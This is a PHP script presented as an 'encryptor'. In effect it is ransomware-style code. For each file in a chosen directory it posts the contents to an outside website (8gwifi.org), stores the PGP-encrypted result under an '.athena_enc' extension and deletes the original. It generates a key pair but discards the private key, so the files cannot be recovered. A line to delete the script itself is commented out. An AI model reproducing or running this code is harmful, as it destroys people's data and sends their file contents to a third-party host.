I<?php

/**
 * Created by : Tristan Granier (@github: graniet, @twitter: graniet75)
 * PHP based encryptor
 */

define('__DEBUG__', true);

class Encryptor
{
    protected $version = "1.0";
    protected $file;
    protected $directory;
    protected $configuration;

    protected function checkArgv()
    {
        if(count($_SERVER['argv']) > 2)
        {
            $options = 'd:';

            $long_options = [
                'folder:'
            ];

            $check = getopt($options, $long_options);

            if(isset($check['d']) || isset($check['directory']))
            {
                if(isset($check['d'])) $this->directory = $check['d'];
                elseif(isset($check['directory'])) $this->directory = $check['directory'];

                if(!is_dir($this->directory))
                    die('Please select correct directory');

                return true;
            }
        }
        return false;
    }

    protected function generate_key()
    {
        if(__DEBUG__ == true)
            echo('GENERATE_KEY_START: ' . date('H:m:s') . PHP_EOL);

        $identity = '';
        if($this->configuration['RANDOM_IDENTITY'] == true)
            $identity = mt_rand(11111, 99999).' '.mt_rand(11111, 99999);
        else
            $identity = $this->configuration['KEY_IDENTITY'];

        $passpharse = '';
        if($this->configuration['RANDOM_PASSPHRASE'] == true)
            $passpharse = mt_rand(111111,999999);
        else
            $passpharse = $this->configuration['PASSPHARSE'];

        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, "https://8gwifi.org/PGPFunctionality");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "methodName=GENERATE_PGEP_KEY&p_identity=".urlencode($identity)."&p_passpharse=".urlencode($passpharse)."&cipherparameter=".urlencode($this->configuration['ENCRYPTION_TYPE'])."&p_keysize=".urlencode($this->configuration['KEY_SIZE']));
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

        $headers = array();
        $headers[] = "Pragma: no-cache";
        $headers[] = "Origin: https://8gwifi.org";
        $headers[] = "Accept-Encoding: gzip, deflate, br";
        $headers[] = "Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7";
        $headers[] = "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36";
        $headers[] = "Content-Type: application/x-www-form-urlencoded";
        $headers[] = "Accept: */*";
        $headers[] = "Cache-Control: no-cache";
        $headers[] = "X-Requested-With: XMLHttpRequest";
        $headers[] = "Cookie: __sharethis_cookie_test__; _ga=GA1.2.1305091625.1517701544; _gid=GA1.2.234384587.1517701544; JSESSIONID=54E6B030EA83595702D812EAAE5E68ED; _gat_gtag_UA_109251861_1=1; __unam=78e6377-1615e0fb420-63aab7db-4; sc_is_visitor_unique=rx9638240.1517703107.26CA960F5A164FA7311B6F22119FCE29.1.1.1.1.1.1.1.1.1";
        $headers[] = "Connection: keep-alive";
        $headers[] = "Referer: https://8gwifi.org/pgpkeyfunction.jsp";
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        $result = curl_exec($ch);
        preg_match_all('#>-----(.*?)<\/textarea>#s', $result, $matches);
        if (curl_errno($ch)) {
            echo 'Error:' . curl_error($ch);
        }
        curl_close ($ch);

        if(isset($matches[1]) && count($matches[1]) > 1)
        {
            if(__DEBUG__ == true)
                echo('GENERATE_KEY_END: ' . date('H:m:s') . PHP_EOL);

            $private_key  = '-----' . $matches[1][0];
            $public_key = '-----' . $matches[1][1];
            return $public_key;
        }
        if(__DEBUG__ == true)
            echo('GENERATE_KEY_ERROR: ' . date('H:m:s') . PHP_EOL);

        return false;


    }

    protected function single_encrypt($file_name, $file_content)
    {
        if(__DEBUG__ == true)
            echo('FILE_ENCRYPTION_START: ' . $file_name . PHP_EOL);

        if(stristr($file_content, '_ATHENA_ENCRYPTOR_SUMMARY'))
            return false;

        if($this->configuration['AUTOMATIC_PUBLIC_KEY_GENERATOR'] == true)
            $this->configuration['PUBLIC_KEY_IF_MANUAL'] = $this->generate_key();

        $content = false;
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, "https://8gwifi.org/PGPFunctionality");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "methodName=PGP_ENCRYPTION_DECRYPTION&encryptdecrypt=encrypt&p_pgpmessage=&p_privateKey=&p_passpharse=&p_cmsg=".trim($file_content)."&p_publicKey=".trim(urlencode($this->configuration['PUBLIC_KEY_IF_MANUAL'])));
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

        $headers = array();
        $headers[] = "Pragma: no-cache";
        $headers[] = "Origin: https://8gwifi.org";
        $headers[] = "Accept-Encoding: gzip, deflate, br";
        $headers[] = "Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7";
        $headers[] = "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36";
        $headers[] = "Content-Type: application/x-www-form-urlencoded";
        $headers[] = "Accept: */*";
        $headers[] = "Cache-Control: no-cache";
        $headers[] = "X-Requested-With: XMLHttpRequest";
        $headers[] = "Cookie: JSESSIONID=21FF5B24DFA4FD1E66F3C014C8BB7594; __sharethis_cookie_test__; _ga=GA1.2.1305091625.1517701544; _gid=GA1.2.234384587.1517701544; __unam=78e6377-1615e0fb420-63aab7db-2; sc_is_visitor_unique=rx9638240.1517701593.26CA960F5A164FA7311B6F22119FCE29.1.1.1.1.1.1.1.1.1";
        $headers[] = "Connection: keep-alive";
        $headers[] = "Referer: https://8gwifi.org/pgpencdec.jsp";
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $result = curl_exec($ch);
        if(stristr($result, 'error'))
        {
            if(__DEBUG__ == true)
                echo('FILE_ENCRYPTION_ERROR: error with encryption' . PHP_EOL);
        }
        if (curl_errno($ch)) {
            echo 'Error:' . curl_error($ch);
        }
        curl_close ($ch);

        preg_match_all('#color=\"green\">(.*?)<\/font>#', $result, $matches);
        if(isset($matches[1][0]))
        {
            $content = $matches[1][0];
            $content = str_replace('<br />', PHP_EOL, $content);
        }
        if($content != false) {
            try {
                $file = fopen($file_name . $this->configuration['EXT'], 'w');
                fwrite($file, $content);
                fclose($file);
                unlink($file_name);
            }
            catch (Exception $e)
            {
                $file = fopen($file_name, 'w');
                fwrite($file, $content);
                fclose($file);
            }
            if(__DEBUG__ == true)
                echo('FILE_ENCRYPTION_SUCCESS: file writed with encoded string.' . PHP_EOL);
        }
        return $content;
    }

    protected function start($directory = '')
    {
        $this->configuration = unserialize('a:1:{s:13:"configuration";a:10:{s:30:"AUTOMATIC_PUBLIC_KEY_GENERATOR";s:4:"true";s:20:"PUBLIC_KEY_IF_MANUAL";s:0:"";s:17:"RANDOM_PASSPHRASE";s:5:"false";s:10:"PASSPHARSE";s:8:"testtest";s:15:"ENCRYPTION_TYPE";s:7:"AES_256";s:8:"KEY_SIZE";s:4:"1024";s:15:"RANDOM_IDENTITY";s:5:"false";s:12:"KEY_IDENTITY";s:18:"hack@theplanet.org";s:11:"PRIVATE_KEY";s:0:"";s:3:"EXT";s:11:".athena_enc";}}')['configuration'];

        if($directory == '')
            $directory = $this->directory;
        if(isset($directory))
        {
            if(__DEBUG__ == true)
                echo('FIND_DIRECTORY: ' . $directory . PHP_EOL);
            $list_file = scandir($directory);
            foreach ($list_file as $file)
            {
                if($file != '.' && $file != '..' && $file != '.DS_Store')
                {
                    if(substr($directory, -1, 1) != '/')
                        $full_path = $directory  . '/' . $file;
                    else
                        $full_path = $directory  . $file;
                    $this->single_encrypt($full_path, file_get_contents($full_path));
                }
            }
            //@unlink(__FILE__);
        }
    }

    public function __construct()
    {
        if(!$this->checkArgv()) {
            die($_SERVER['argv'][0] . ": Please set '-d' argument");
        }
        $this->start();
    }
}

new Encryptor();
